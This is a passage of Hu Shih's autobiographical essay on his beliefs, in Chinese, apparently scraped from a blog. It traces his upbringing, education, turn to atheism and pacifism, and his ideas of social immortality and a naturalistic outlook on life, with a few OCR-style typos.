p，故译庚贴似较贴切。）我外祖父答应回去和家里商量。但到他在晚上把所提的话对他的妻子说了，她就大生气。她说：“不行！把我女儿嫁给一个大她三十岁的人，你真想得起？况且他的儿女也有年纪比我们女儿还大的！还有一层，人家自然要说我们嫁女儿给一个老官，是为厂钱财体面而把她牺牲的。”于是这一对老夫妻吵了一场。后来做父亲的说：“我们问问女儿自己。说来说去，这到底是她自己的事。”\n到这个问题对我母亲提了出来，她不肯开口。中国女子遇到同类的情形常是这样的。但她心里却在深思沉想。嫁与中年丧偶、兼有成年儿女的人做填房，送给女家的聘金财扎比一般婚姻却要重得多，这点于她父亲盖房子的计划将大有帮助。况她以前又是见过我父亲的，知道他为全县人所敬重。她爱慕他，愿意嫁他，为的半是英雄崇拜的意识，但大半却是想望帮助劳苦的父亲的孝恩。所以到她给父亲逼着答话，她就坚决的说：“只要你们俩都说他是好人，请你们俩作主。男人家四十七岁也不能算是老。”我外祖父听了，叹了一口气，我外祖母可气的跳起来，忿忿的说：“好呵！你想做官太太了！好罢，听你情愿罢！”\n我母亲于一八八九年结婚，时年十七，我则生在一八九一年十二月。我父殁于一八九五年，留下我母亲二十三岁做了寡妇。我父弃世，我母便做了一个有许多成年儿女的大家庭的家长。中国做后母的地位是十分困难的。她的生活自此时起，自是一个长时间的含辛茹苦。\n我母亲最大的禀赋就是容忍。中国史书记载唐朝有个皇帝垂询张公仪那位家长，问他家以什么道理能九世同居而不分离拆散。那位老人家因过于衰迈，难以口述，请准用笔写出回答。他就写了一百个“忍”字。中国道德家时常举出“百忍”的故事为家庭生活最好的例子，但他们似乎没有一个曾觉察到许多苦恼、倾轧、压迫和不平，使容忍成了一种必不可少的事情。\n那班接脚媳妇凶恶不善的感情，利如锋刃的话语，含有敌意的嘴脸，我母亲事事都耐心容忍。她有时忍到不可再忍，这才早上不起床，柔声大哭，哭她早丧丈夫，她从不开罪她的媳妇，也不提开罪的那件事，但是这些眼泪，每次都有神秘莫测的效果。我总听得有一位嫂嫂的房门开了，和一个妇人的脚步声向厨房走去。不多一会，她转来敲我们房门了。她走进来捧着一碗热茶，送给我的母亲，劝她止哭，母亲接了茶碗，受了她不出声的认错，然后家里又太平清静得个把月。\n我母亲虽则并不知书识字，却把她的全副希望放在我的教育上。我是一个早慧的小孩，不满三岁时，就已认了八百多字，都是我父亲每天用红笺方块教我的。我才满三岁零点，便在学堂里念书。我当时是个多病的小孩，没有搀扶，不能跨一个六英寸高的门槛。但我比学堂里所有别的学生都能读能记些。我从不跟着村中的孩子们一块儿玩。更因我缺少游戏，我五岁时就得了“先生”的绰号。十五年后，我在康奈耳大学做二年级时，也同是为了这个弱点，而被houD比tor 缩读，音与dog同，故用作谐称。译者）的浑名。\n每天天还未亮时，我母亲便把我喊醒，叫我在床上坐起。她然后把对我父亲所知的一切告诉我。她说她望我踏上他的脚步，她一生只晓得他是最善良最伟大的人。据她说，他是一个多么受人敬重的人，以致在他间或休假回家的时期中，附近烟窟赌馆都改行停业。她对我说我惟有行为好，学业科考成功，才能使他们两老增光；又说她所受的种种苦楚，得以由我勤敏读书来酬偿。我往往眼睛半睁半闭的听。但她除遇有女客与我们同住在一个房间的时候外，罕有不施这番晨训的。\n到天大明时，她才把我的衣服穿好，催我去上学。我年稍长，我总是第一个先到学堂，并且差不多每天早晨都是去敲先生的门要钥匙去开学堂的门。钥匙从门缝里递了出来。我隔一会就坐在我的座位上朗朗念书了。学堂里到薄暮才放学，届时每个学生都向朱印石刻的孔夫子大像和先生鞠躬回家。日中上课的时间平均是十二小时。\n我母亲一面不许我有任何种类的儿童游戏，一面对于我建一座孔圣庙的孩子气的企图，却给我种种鼓励。我是从我同父异母的姊姊的长子，大我五岁的一个小孩那里学来的。他拿各种华丽的色纸扎了一座孔庙，使我心里羡慕。我用一个大纸匣子作为正殿，背后开了一个方洞，用一只小匣子糊上去，做了摆孔子牌位的内堂。外殿我供了孔子的各大贤徒，并贴了些小小的匾对，书着颂扬这位大圣人的字句，其中半系录自我外甥的庙里，半系自书中抄来。在这座玩具的庙前，频频有香炷燃着。我母亲对于我这番有孩子气的虔敬也觉得欢喜，暗信孔子的神灵一定有报应，使我成为一个有名的学者，并在科考中成为一个及第的士子。\n我父亲是一个经学家，也是一个严守朱熹（—一三零——一二零零）的新儒教理学的人。他对于释道两教强烈反对。我还记得见我叔父家（那是我的开蒙学堂）的门上有一张日光晒谈了的字条，写着“僧道无缘”几个字。我后来才得知道这是我父亲所遗理学家规例的一部。但是我父亲业已去世，我那彬彬儒雅的叔父，又到皖北去做了一员小吏，而我的几位哥子则都在上海。剩在家里的妇女们，对于我父亲的理学遗规，没有什么拘束了。他们尊守敬奉祖宗的常礼，并随风俗时会所趋，而自由礼神拜佛。观音菩萨是他们所最爱的神，我母亲是为了出于焦虑我的健康福祉的念头，也做了观音的虔诚信士。我记得有一次她到山上观音阁里去进香，她虽缠足，缠足是苦了一生的，在整段的山路上，还是步行来回。\n我在村塾（村中共有七所）里读书。读了九年（一八九五——一九零四）。在这个期间，我读习并记诵了下列几部书： 1.《孝经》：孔子后的一部经籍，作者不明。 2.《小学》：一部论新儒教道德学说的书，普通谓系宋哲朱烹所作。 3.《四书）：《论语》、《孟子》、《大学》、《中庸》。 4.《五经》中的四经：《诗经》、《尚书》、《易经》、《礼记》。\n我母亲对于家用向来是节省的，而付我先生的学金，却坚要比平常要多三倍。平常学金两块银元一年，她首先便送六块钱，后又逐渐增加到十二元。由增加学金这一点小事情，我得到千百倍于上述数目比率所未能给的利益。因为那两元的学生，单单是高声朗读，用心记诵，先生从不劳神去对他讲解所记的字。独我为了有额外学金的缘故，得享受把功课中每字每句解给我听，就是将死板文字译作白话这项难得的权利。\n我年还不满八岁，就能自己念书，由我二哥的提议，先生使我读《资治通鉴》。这部书，实在是大历史家司马光于一零八四年所辑编年式的中国通史。这番读史，使我发生很大的兴趣，我不久就从事把各朝代各帝王各年号编成有韵的歌诀，以资记忆。\n随后有一天，我在叔父家里的废纸箱中，偶然看见一本《水浒传》的残本，便站在箱边把它看完了。我跑遍全村，不久居然得着全部。从此以后，我读尽了本村邻村所知的小说。这些小说都是用白话或口语写的，既易了解、又有引人人胜的趣味。它们教我人生，好的也教，坏的也教，又给了我一件文艺的工具，若干年后，使我能在中国开始民众所称为“文学革命”（iteng Renaissance ，直译当为文艺复兴。译者）的运动。\n其时，我的宗教生活经过一个特异的激变。我系生长在拜偶像的环境，习于诸神凶恶丑怪的面孔，和天堂地狱的民间传说。我十一岁时，一日，温习朱子的《小学》，这部书是我能背诵而不甚了解的。我念到这位理学家引司马光那位史家攻击天堂地狱的通俗信仰的话。这段话说：“形既朽灭，神亦飘散，虽有判烧春磨，亦无所施。”这话好像说得很有道理，我对于死后审判的观念，就开始怀疑起来。\n往后不久，我读司马光的《资治通鉴》，读到第一百三十六卷中有一段，使我成了一个无神论者。所说起的这一段，述纪元五世纪名范缜的一位哲学家，与朝众竞辩“神灭论”。朝廷当时是提倡大乘佛法的。范缜的见解，由司马光摄述为这几句话：“形者神之质地，神者形之用也。神之于形，犹利之于刃。未闻刃没而利存，岂容形灭而神在哉。”\n这比司马光的形灭神散的见解——一种仍认有精神的理论——还更透彻有理。范缜根本否认精神为一种实体，谓其仅系神之用。这一番化繁为简合着我儿童的心胸。读到“朝野喧哗，难之，终不能屈”，更使我心悦。\n同在那一段内，又引据范缜反对因果轮回说的事。他与竞陵工谈论，王对他说：“君不信因果，何得有富贵贫贱？”范缜答道：“人生如树花同发，随风而散；或拂帘幌，坠茵席之上；或关篱墙，落粪涵之中。堕茵席者，殿下是也；落粪涵者，下官是也。贵贱虽复殊途，因果竟在何处？”\n因果之说，由印度传来，在中国人思想生活上已成了主要部分的少数最有力的观念之一。中国古代道德家，常以善有善报，恶有恶报为训。但在现实生活上并不真确。佛教的因果优于中国果报观念的地方，就是可以躲过这个问题，将其归之于前世来世不断的轮回。\n但是范缜的比喻，引起了我幼稚的幻想，使我摆脱了恶梦似的因果绝对论，这是以偶然论来对定命论。而我以十一岁的儿童就取了偶然论而叛离了运命，我在那个儿童时代是没有牵强附会的推理的，仅仅是脾性的迎拒罢了。我是我父亲的儿子，司马光和范缜又得了我的心。仅此而已。\n但是这一种心境的激变，在我早年不无可笑的结果，一九零三年的新年里，我到我住在二十四里外的大姊家去拜年。在她家住了几天，我和她的儿子回家，他是来拜我母亲的年的。他家的一个长工替他挑着新年礼物。我们回到路上，经过一个亭子，供着几个奇形怪状的神像。我停下来对我外甥说：“这里没有人看见，我们来把这几个菩萨抛到污泥坑里去罢。”我这带孩子气的毁坏神像主张，把我的同伴大大地吓住了。他们劝我走路，莫去惹那些本来已经濒于危境的神道。\n这一天正是元宵灯节，我们到了家中，家里有许多客人，我的肚子已经饿了，开饭的时候，我外甥又劝我喝了上杯烧酒。酒在我的肚子里，便作怪起来。我不久便在院子里跑，喊月亮下来看灯。我母亲不悦，叫人来捉我。我在他们前头跑，酒力因我跑路，作用更起得快。我终被捉住，但还努力想挣脱。我母亲抱住我，不久便有许多人朝我们围拢来。\n我心里害怕，便胡言乱道起来。于是我外甥家的长工走到我母亲身边，低低的说：“外婆，我想他定是精神错乱了。恐怕是神道怪了他。今天下午我们路过三门亭，他提议要把几尊菩萨抛到污泥坑里去。一定是这番话弄出来的事。”我窃听了长工的话，忽然想出一条妙计。我喊叫得更凶，好像我就真是三门亭的一个神一样。我母亲于是便当空焚香祷告，说我年幼无知无咎，许下如果蒙神恕我小孩子的罪过，定到亭上去烧香还愿。\n这时候，得报说龙灯来了，在我们屋里的人，都急忙跑去看，只剩下我和母亲两个人。一会儿我就睡着了。母亲许的愿，显然是灵应了。一个月后，我母亲和我上外婆家去，她叫我恭恭敬敬地在三门亭还我们许下的愿。\n我年甫十三，即离家上路七日，以求“新教育”于上海。自这次别离后，我于十四年之中，只省候过我母亲三次，一总同她住了大约七个月。出自她对我伟大的爱忱，她送我出门，分明没有酒过一滴眼泪就让我在这广大的世界中，独自求我自己的教育和发展，所带着的，只是一个母亲的爱，一个读书的习惯，和一点点怀疑的倾向。\n我在上海过了六年（一九零四——一九一零），在美国过了七年（一九一零——一九一七）。在我停留在上海的时期内，我经历过三个学校（无一个是教会学校），一个都没有毕业，我读了当时所谓的“新教育”的基本东西，以历史、地理、英文、数学，和一点零碎的自然科学为主。从故林纤氏及其他请人的意译文字中，我初次认识一大批英国和欧洲的小说家，司各提（SCott ），狄更司（Dickens ），大小仲马（DU.ereet ils）、嚣俄，以及托尔斯泰等氏的都在内。我读了中国上古、中古几位非儒教和新儒教哲学家的著作，并喜欢墨翟的兼爱说与老子、庄子有自然色彩的哲学。\n从当代力量最大的学者梁启超氏的通俗文字中，我渐得略知霍布士、笛卡儿、卢骚、宾坦、康德、达尔文等诸泰西思想家。梁氏是一个崇拜近代西方文明的人，连续发表了些文字，坦然承认中国人以一个民族而言，对于欧洲人所具有许多良好特性，感受缺乏；显著的是注重公共道德，国家思想，爱冒险，私人权利观念与热心防其被侵，爱自由，自治能力，结合的本事与组织的努力，注意身体的培养与健康等。就是这几篇文字猛力把我以我们古旧文明为自足，除战争的武器，商业转运的工具外，没有什么要向西方求学的这种安乐梦中，震醒出来。它们开了给我，也就好像开了给几千几百别的人一样，对于世界整个的新眼界。\n我又读过严复所译穆勒的《自由论》和赫胥黎的《天演论》。严氏所译赫胥黎的论著，于一八九八年就出版，并立即得到知识阶级的接受。有钱的人拿钱出来翻印新版以广流传（当时并没有版权），因为有人以达尔文的言论，尤其是它在社会上与政治上的运用，对于一个感受惰性与儒滞日久的民族，乃是一个合宜的刺激。\n数年之间，许多的进化名词在当时报章杂志的文字上，就成了口头禅。无数的人，都采来做自己的和儿辈的名号，由是提醒他们国家与个人在生存竞争中消灭的祸害。向尝一度闻名的陈炯明以“竞存”为号。我有两个同学名杨天择和孙竞存。\n就是我自己的名字，对于中国以进化论为时尚，也是一个证据。我请我二哥替我起个学名的那天早晨，我还记得清楚。他只想了一刻，他就说，“‘适者生存’中的‘适’字怎么样？”我表同意；先用来做笔名，最后于一九一零年就用作我的名字。\n我对于达尔文与斯宾塞两氏进化假说的一些知识，很容易的与几个中国古代思想家的自然学说连了起来。例如在道家伪书《列子》所述的下面这个故事中，发现二千年前有一个一样年轻，同抱一样信仰的人，使我的童心欢悦：齐田氏祖于庭，食客千人。中坐有献鱼雁者，田氏视之，乃叹日：“天之于民厚矣！殖五谷，生鱼鸟以为之用。”众客和之如响。鲍氏之子，年十二，预于次，进日：“不如君言。天地万物，与我并生，类也。类无贵贱，徒以大小智力而相制，造相食，非相为而生之。人取食者而食之，岂天本为人而生之，且蚊纳哈肤，虎狼食肉，岂天本为蚊的生人，虎狼生肉者钱？”\n一九零六年，我在中国公学同学中，有几位办了一个定期刊物，名《竞业旬报》，——达尔文学说通行的又一例子——其主旨在以新思想灌输于未受教育的民众，系以白话刊行。我被邀在创刊号撰搞。一年之后，我独自做编辑。我编辑这个杂志的工作不但帮助我启发运用现行口语为一种文艺工具的才能，且以明白的话语及合理的次序，想出自我幼年就已具了形式的观念和思想。在我为这个杂志所著的许多论文内，我猛力攻击人民的迷信，且坦然主张毁弃神道，兼持无神论。\n一九零八年，我家因营业失败，经济大感困难。我于十七岁上，就必需供给我自己读书，兼供养家中的母亲。我有一年多停学，教授初等英文，每日授课五小时，月得修金八十元。一九一0 年，我教了几个月的国文。\n那几年（一九零九——一九一零）是中国历史上的黑暗时代，也是我个人历史上的黑暗时代。革命在好几省内爆发，每次都归失败。中国公学原是革命活动的中心，我在那里的旧同学参加此等密谋的实繁有徒，丧失生命的为数也不少。这班政治犯有好些来到上海与我住在一起，我们都是意气消沉，厌世悲观的。我们喝酒，作悲观的诗词，日夜谈论，且往往作没有输赢的赌博。我们甚至还请了一个老伶工来教我们唱戏。有一天早上，我作了一首诗，中有这一句：“霜浓欺日淡”！\n意气消沉与执劳任役驱使我们走人了种种的流浪放荡。有一个雨夜，我喝酒喝得大醉，在镇上与巡捕角斗，把我自己弄进监里去关了一夜。到我次晨回寓，在镜中看出我脸上的血痕，就记起李白饮酒歌中的这一句：“有人用武力，任出吾身物。”。这一句一时也查不出原文。）我决心脱离教书和我的这班朋友。下了一个月的苦工夫，我就前往北京投考用美国退还庚子赔款所设的学额。我考试及格，即于七月间放洋赴美。\n我到美国，满怀悲观。但不久便交结了些朋友，对于那个国家和人民都很喜爱。美国人出自天真的乐观与朝气给了我很好的印象。在这个地方，似乎无一事一物不能由人类智力做得成的。我不能避免这种对于人生持有喜气的眼光的传染，数年之间，就渐渐治疗了我少年老成的态度。\n我第一次去看足球比赛时，我坐在那里以哲学的态度看球赛时的粗暴及狂叫欢呼为乐。而这种狂叫欢呼在我看来，似乎是很不够大学生的尊严的。但是到竞争愈渐激烈，我也就开邮悟这种热心。随后我偶然回头望见白了头发的植物学教授劳理先生诚心诚意的在欢呼狂叫，我觉得如是的自惭，以致我不久也就热心的陪着众人欢呼了。\n就是在民国初年最黑暗的时期内，我还是想法子打起我的精神。在致一个华友的信里面，我说道：“除了你我自己灰心失意，以为无希望外，没有事情是无希望的。”（译意——译者。）在我的日记上，我记下些引录的句子，如引克洛浦的这一句：“如果希望是麻醉物，恐惧就是作伪者。”又如我自己译自勃朗宁的这一节诗：从不转背而挺身向前，从不怀疑云要破裂，虽合理的弄糟，违理的占胜，而从不作迷梦的，相信我们沉而再升，败而再战，睡而再醒。\n一九一四年一月，我写这一句在我的日记上：“我相信我自离开中国后，所学得的最大的事情，就是这种乐观的人生哲学了。”一九一五年，我以关于勃朗宁最优的论文得受柯生奖金。我论文的题目是《勃朗宁乐观主义辩》。我想来大半是我渐次改变了的人生观使我于替他辩护时，以一种诚信的意识来发言。\n我系以在康奈耳大学做纽约农科学院的学生开始我的大学生涯。我的选择是根据了当时中国盛行的，谓中国学生须学点有用的技艺，文学、哲学是没有什么实用的这个信念。但是也有一个经济的动机。农科学院当时不收学费，我心想或许还能够把每月的月费省下一部来汇给我的母亲。\n农场上的经验我一点都不曾有过，并且我的心也不在农业上。一年级的英国文学及德文课程，较之农场实习和养果学，反使我感觉兴趣。踌躇观望了一年又半，我最后转人文理学院，一次缴纳四个学期的学费，就是使我受八个月困境的处分。但是我对于我的新学科觉得更为自然，从不懊悔这番改变。\n有一科《欧洲哲学史》——归故克莱顿教授那位恩师主持，——领导我以哲学做了主科。我对于英国文学与政治学也深有兴趣。康奈耳的哲学院是唯心论的重镇。在其领导之下，我读了古代近代古典派哲学家比较重要的著作，我也读过晚近唯心论者如布拉特莱，鲍森模等的作品，但是他们提出的问题从未引起我的兴趣。\n一九一五年，我往哥林比亚大学，就学于杜威教授，直至一九一七年我回国之时为止。得着杜威的鼓励，我著成我的论文《先秦名学史》这篇论文，使我把中国古代哲学著作重读一遍，并立下我对于中国思想史的一切研究的基础。\n我留美的七年间，我有许多课外的活动，影响我的生命和思想，说不定也与我的大学课业一样。当意气颓唐的时候，我对于基督教大感兴趣，且差不多把《圣经》读完。一九—一年夏，我出席于在宾雪凡尼亚普柯诺派思司举行的中国基督教学生会的大会做来宾时，我几乎打定主意做了基督徒。\n但是我渐渐的与基督教脱离，虽则我对于其发达的历史曾多有习读，因为有好久时光我是一个信仰无抵抗主义的信徒。耶稣降生前五百年，中国哲学家老子曾传授过上善若水，水善应万物而不争。我早年接收老子的这个教训，使我大大的爱着《登山宝训》。\n一九一四年，世界大战爆发，我深为比利时的命运所动，而成了一个确定的无抵抗者。我在康奈耳大同俱乐部）住了三年，结交了许多各种国籍的热心朋友。受着像那士密氏）和麦慈那样唯心的平和论者的影响，我自己也成了一个热心的平和论者。大学废军联盟因维腊特的提议而成立于一九一五年，我是其创办人之一。\n到后来，各国际政体俱乐部成立，我在那士密氏和安格尔的领导之下，做了一个最活动的会员，且曾参加过其起首两届的年会。一九一六年，我以我的论文《国际关系中有代替武力的吗？》得受国际政体俱乐部的奖金。在这篇论文里，我阐明依据以法律为有组织的武力建立一个国际联盟的哲理。\n我的平和主义与国际大同主义往往使我陷人十分麻烦的地位。日本由攻击德国在山东的领土以加人世界大战时，向世界宣布说，这些领土“终将归还中国”。我是留美华人中唯一相信这个宣言的人，并以文字辩驳说，日本于其所言，说不定是意在必行的。关于这一层，我为许多同辈的学生所嘲笑。及一九一五年日本提出有名的对华二十一条件，留美学生，人人都赞成立即与日本开战。我写了一封公开的信给《中国留美学生月报》，劝告处之以温和，持之以冷静。我为这封信受了各方面的严厉攻击，屡被斥为卖国贼。战争是因中国接受一部要求而得避免了，但德国在华领土则直至七年之后才交还中国。\n我读易卜生、莫黎和赫胥黎诸氏的著作，教我思考诚实与发言诚实的重要。我读过易卜生所有的戏剧，特别爱看《人民之敌》、莫黎的《论妥协》，先由我的好友威廉思女士介绍给我，她是一直做了左右我生命最重要的精神力量。莫黎曾教我：“一种主义，如果健全的话，是代表一种较大的便宜的。为了一时似是而非的便宜而将其放弃，乃是为小善而牺牲大善。疲弊时代，剥夺高贵的行为和向上的品格，再没有什么有这样拿得定的了。”\n赫胥黎还更进一步教授一种理知诚实的方法。他单单是说：“拿也如同可以证明我相信别的东西为合理的那种种证据来，那么我就相信人的不朽了。向我说类比和或能是说无用的。我说我相信倒转平方律时，我是知道我意何所指的，我必不把我的生命和希望放在较弱的信证上。”赫胥黎也曾说过：“一个人生命中最神圣的举动，就是说出并感觉得我相信某项某项是真的。生在世上一切最大的赏，一切最重要的罚，都是系在这个举动上”。\n人生最神圣的责任是努力思想得好，我就是从杜威教授学来的。或思想得不精，或思想而不严格的到它的前因后果，接受现成的整块的概念以为思想的前提，而于不知不觉间受其个人的影响，或多把个人的观念由造成结果而加以测验，在理知上都是没有责任心的。真理的一切最大的发现，历史上一切最大的灾祸，都有赖于此。\n杜威给了我们一种思想的哲学，以思想为一种艺术，为一种技术。在《思维术》和《实验逻辑论文集》里面，他制出这项技术。我察中不但于实验科学上的发明为然，即于历史科学上最佳的探讨，内容的详定，文字的改造，及高等的批评等也是如此。在这种种境域内，曾由同是这个技术而得到最佳的结果。这个技术主体上是具有大胆提出假设，和（加）上诚恳留意于制裁与证实。这个实验的思想技术，堪当创造的智力这个名称，因其在运用想象机智以寻求证据，做成实验上，和在自思想有成就的结实所发出满意的结果上，实实在在是有创造性的。\n奇怪之极，这种功利主义的逻辑竟使我变成了一个做历史探讨工作的人。我曾用进化的方法去思想，而这种有进化性思想习惯，就做I 我此后在思想史及文学工作上的成功之钥。尤更奇怪的，这个历史的思想方法并没有使我成为一个守旧的人，而时常是进步的人。例如，我在中国对于文学革命的辩论，全是根据无可否认的历史进化的事实，且一向都非我的对方所能答复得来的。\n我母亲于一九一八年逝世。她的逝世，就是引导我把我在这广大世界中摸索了十四年多些的信条第一次列成条文的时机。这个信条系于一九一九年发表在以《不朽》为题的一篇文章里面。\n因有找在幼童时期读书得来的学识，我早久就已摒弃了个人死后生存的观念了。好多年来，我都是以一种“三不朽”的古说为满意，这种古说我是在《春秋左氏传》里面找出来的。传记里载贤臣叔孙豹于纪元前五四八年（时孔子还只有三岁。泽者按，即鲁襄公二十四年）谓有立德、立功、立言三不朽。此三者“虽久不忘，此之谓不朽”。这种学说引动我心有如是之甚，以致我每每向我的外国朋友谈起，并给了它一个名字，叫做“三W 的不朽主义”。\n我母亲的逝世使我从新想到这个问题，我就开始觉得三不朽的学说有修正的必要。第一层，其弱点在太过概括一切。在这个世界上，有多少人其在德行功绩言语上的成就，其哲理上的智慧能久久不忘的呢？例如哥伦布是可以不朽了，但是他那些别的水手怎样呢？那些替他造船或供给他用具的人，那许多或由作有勇敢的思考，或由在海洋中作有成无成的探险，替他铺下道路的前导又怎样呢？简括的说，一个人应有多大的成就，才可以得不朽呢？\n次一层，这个学说对于人类的行为没有消极的裁制。美德固是不朽的了，但是恶德又怎样呢？我们还要再去借重审判日或地狱之火吗？\n我母亲的活动从未超出家庭间琐屑细事之外，但是她的左右力，能清清楚楚的从来吊祭她的男男女女的脸上看得出来。我检阅我已死的母亲的生平，我追忆我父亲个人对她毕生左右的力量，及其对我本身垂久的影响，我遂诚信一切事物都是不朽的。我们所做的一切什么人，我们所干的一切什么事，我们所讲的一切什么话，从在世界上某个地方自有其影响这个意义看来，都是不朽的。这个影响又将依次在别个地方有其效果，而此事又将继续人于无限的空间与时间。\n正如列勃涅慈有一次所说：“人人都感觉到在宇宙中所经历的一切，以及那目睹一切的人，可以从经历其他各处的事物，甚至曾经并将识别现在的事物中，解识出在时间与空间上已被移动的事物。我们是看不见一切的，但一切事物都在那里，达到无穷境无穷期”。一个人就是他所吃的东西，所以达柯塔的务农者，加利芳尼亚的种果者，以及千百万别的粮食供给者的工作，都是生活在他的身上。一个人就是他所想的东西，所以凡曾于他有所左右的人——自苏格拉底、柏拉图、孔子以至于他本区教会的牧师和抚育保姆——都是生活在他的身上。一个人也就是他所享乐的东西，所以无数美术家和以技取悦的人，无论现尚生存或久已物故，有名无名，崇高粗俗，都是生活在他的身上。诸如此类，以至于无穷。\n一千四百年前，有一个人写了一篇论“神灭”的文章，被认为亵读神圣，有如是之甚，以致其君皇敕七十个大儒来相驳难，竟给其驳倒。但是五百年后，有一位史家把这篇文章在他的伟大的史籍中纪了一个撮要。又过了九百年，然后有一个十一岁的小孩偶然碰到这个三十五个字的简单撮要，而这三十五个字，于埋役了一千四百年之后，突然活了起来而生活于他的身上，更由他而生活于几千几百个男男女女的身上。\n一九一二年，我的母校来了一位英国讲师，发表一篇演说，（论中国建立共和的不可能）。他的演讲当时我觉得很为不通，但是我以他对于母音O 的特异的发音方法为有趣，我就坐在那里摹拟以自娱。他的演说久已忘记了，但是他对于母音O的发音方法，这些年来却总与我不离，说不定现在还在我的几千百个学生的口上，而从没有觉察到是由于我对于布兰特先生的恶作剧的摹仿，而布兰特先生也是从不知道的。\n两千五百年前，希马拉雅山的一个山峡里死了一个乞丐。他的尸体在路旁已在腐溃了，来了一个少年王子，看见这个怕人的景象，就从事思考起来。他想到人生及其他一切事物的无常，遂决心脱离家庭，前往旷野中去想出一个自救以救人类的方法。多年后，他从旷野里出来，做了释迦佛，而向世界宣布他所找出的拯救的方法。这样，甚至一个死丐尸体的腐溃，对于创立世界上一个最大的宗教，也曾不知不觉的贡献了其一部分。\n这一个推想的线索引导我信了可以称为社会不朽的宗教，因为这个推想在大体上全系根据于社会对我的影响，日积月累而成小我，小我对于其本身是些什么，对于可以称社会、人类或大自然的那个大我有些什么施为，都留有一个抹不去的痕记这番意思。小我是会要死的，但是他还是继续存活在这个大我身上。这个大我乃是不朽的，他的一切善恶功罪，他的一切言行思想，无论是显著的或细微的，对的或不对的，有好处或有坏处——样样都是生存在其对于大我所产生的影响上。这个大我永远生存，做了无数小我胜利或失败的垂久宏大的佐证。\n这个社会不朽的概念之所以比中国古代三不朽学说更为满意，就在于包括英雄圣贤，也包括贱者微者，包括美德，也包括恶德，包括功德，也包括罪孽。就是这项承认善的不朽，也承认恶的不朽，才构成这种学说道德上的许可。一个死尸的腐烂可以创立一个宗教，但也可以为患全个大陆。一个酒店侍女偶发一个议论，可以使一个波斯僧侣豁然大悟，但是一个错误的政治或社会改造议论，却可以引起几百年的杀人流血。发现一个极微的杆菌，可以福利几千百万人，但是一个害痨的人吐出的一小点痰涎，也可以害死大批的人，害死几世几代。\n人所做的恶事，的确是在他们身后还存在的！就是明白承认行为的结果才构成我们道德责任的意识。小我对于较大的社会的我负有巨大的债项，把他干的什么事情，作的什么思想，做的什么人物，概行对之负起责任，乃是他的职分。人类之为现在的人类，。固是由我们祖先的智行愚行所造而成，但是到我们做完了我们分内时，我们又将由人类将成为怎么样而受裁判了。我们要说，“我们之后是大灾大厄”吗？抑或要说，“我们之后是幸福无疆”吗？\n一九二三年，我又得了一个时机把我的信条列成更普通的条文。地质学家丁文江氏所著，在我所主编的一个周报上发表，论《科学与人生观》的一篇文章，开始了一场用差不多延持了一个足年的长期论战。在中国凡有点地位的思想家。全都曾参与其事。到一九二三年终，由某个善经营的出版家把这论战的文章收集起来，字数竟达二十五万。我被请为这个集子作序。我的序言给这本已繁重的文集又加了一万字，而以我所拟议的“新宇宙观和新人生观的轮廓”为结论，不过有些含有敌意的基督教会，却以恶作剧的口吻，称其为“胡适的新十诫”，我现在为其自有其价值而选择出来：（译者按：以下原系由中文译成英文，故不再译，即径录胡先生中文原文。）\n1 2 3 4 5 6 7 8 9 10 （1 ）根据于天文学和物理学的知识，叫人知道空间的无限之大。 （2 ）根据于地质学及古生物学的知识，叫人知道时间的无穷之长。 （3 ）根据于一切科学，叫人知道宇宙及其中万物的运行变迁皆是自然的，——自己如此的，——正用不着什么超自然的主宰或造物者。 （4 ）根据于生物学的科学知识，叫人知道生物界的生存竞争的浪费与惨酷，——因此叫人更可以明白那“有好生之德”的主宰的假设是不能成立的。 （5 ）根据于生物学、生理学、心理学的知识，叫人知道人不过是动物的一种；他和别种动物只有程序的差异，并无种类的区别。 （6 ）根据于生物的科学及人类学、人种学、社会学的知识，叫人知道生物及人类社会演进的历史和演进的原因。 （7 ）根据于生物的及心理的科学，叫人知道一切心理的现象都是有因的。 （8 ）根据于生物学及社会学的知识，叫人知道道德礼教是变迁的，而变迁的原因都是可以用科学的方法寻求出来的。 （9 ）根据于新的物理化学的知识，叫人知道物质不是死的，是活的；不是静的，是动的。 （10）根据于生物学及社会学的知识，叫人知道个人——“小我”——是要死灭的，而人类——“大我”——是不死的，不朽的；叫人知道“为全种万世而生活”就是宗教，就是最高的宗教。而那些替个人谋死后的“天堂”“净土”的宗教，乃是自私自利的宗教。 我结论道：“这种新人生观是建筑在二三百年的科学常识之上的一个大假设，我们也许可以给他加上‘科学的人生观’的尊号。但为避免无谓的争论起见，我主张叫他做‘自然主义的人生观’。\n“我们在那个自然的宇宙里，在那无穷之大的空间里，在那无穷之长的时间里，这个平均高五尺六寸，上寿不过百年的两手动物——人——真是一个藐乎其小的微生物了。在那个自然主义的宇宙里，天行是有常度的，物变是有自然法则的，因果的大法支配着他——人——的一切生活，生存竞争的惨剧鞭策着他的一切行为，——这个两手动物的自由真是很有限的了。\n“然而那个自然主义的宇宙里的这个涉小的两手动物，却也有他的相当的地位和相当的价值。他用的两手和一个大脑，居然能做出许多器具，想出许多方法，造成一点文化。他不但驯伏了许多禽兽，他还能考究宇宙间的自然法则，利用这些法则来驾驭天行，到现在他居然能叫电气给他赶车，以太阳给他送信了。\n“他的智慧的长进就是他的能力的增加。然而智慧的长进却又使他的胸襟扩大，想象力提高。他也曾拜物拜畜生，也曾怕神怕鬼，但他现在渐渐的脱离了这种种幼稚的时期，他现在渐渐明白：空间之大只增加他对于宇宙的美感；时间之长只使帅外明了祖宗创业之艰难；天行之有常只增加他制裁自然界的能力。\n“甚至于因果律之笼罩一切，也并不见得束缚他的自由。因为因果律的作用，一方面使他可以由因求果，由果推因，解释过去，预测未来；一方面又使他可以运用他的智慧，创造新因，以求新果。甚至于生存竞争的观念也并不见得就使他成为一个冷酷无情的畜生，也许还可以格外增加他对于同类的同情心，格外使他深信互助的重要，格外使他注重人为的努力，以减免天然竞争的惨酷与浪费。总而言之，这个自然主义的人生观里，未尝没有美，未尝没有诗意，未尝没有道德的责任，未尝没有充分运用创造的智慧的机会。”\n编后记： 胡适，中国新文化运动的开拓者之一。美国《展望》杂志曾经把他列为当今世界有影响力的100 个伟人之一。 散文是胡适的重要的文学成果之一。他一生奔逐南北，阅历丰富，学贯中西，知识渊博；散文材料翔实，说理透彻，文风平实，明白晓畅，代表了现代散文的一个重要流派。作为一个开风气的人，由于他曾经致力于介绍新观念，新方法，而散文又是这方面的载体，因此，阅读他的散文，可以从中得到许多知识的享受和人生的启迪。\n","permalink":"https://ret2neo.cn/mind/180822-my-faith/","summary":"转自 梦远书城 : 胡适《实用人生》 